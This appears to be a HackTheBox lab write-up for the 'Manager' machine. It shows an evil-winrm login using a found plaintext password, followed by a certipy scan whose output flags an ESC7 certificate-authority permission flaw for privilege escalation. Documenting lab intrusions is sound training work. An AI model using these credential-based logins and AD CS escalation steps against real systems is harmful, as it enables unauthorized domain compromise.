# Explanation
After finding the credentials of the raven user, I used evil-winrm to log in using the credentials and I got access. After getting access to the machine, I decided to look through and one way I found to escalate privileges was by certificate escalation through vulnerable certificates. I followed the following Hacktricks page to perform my escalation, "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation". I ran the command to find vulnerable certificate and it suggested using ESC7 to further exploit.

# Evil-Winrm
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Manager]
└─# evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i manager.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> ls
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ..
ls
*Evil-WinRM* PS C:\Users\Raven> ls
 

    Directory: C:\Users\Raven


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       11/22/2023  12:03 AM                Desktop
d-r---        7/27/2023   8:23 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\Raven> cd Desktop
*Evil-WinRM* PS C:\Users\Raven\Desktop> ls


    Directory: C:\Users\Raven\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/21/2023  10:13 PM             34 user.txt
-a----       11/22/2023  12:03 AM        2387968 winPEAS.exe


*Evil-WinRM* PS C:\Users\Raven\Desktop>
```

# Finding vulnerable certificates
```
──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -text
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved text output to '20231122005141_Certipy.txt'

┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# cat 20231122005141_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```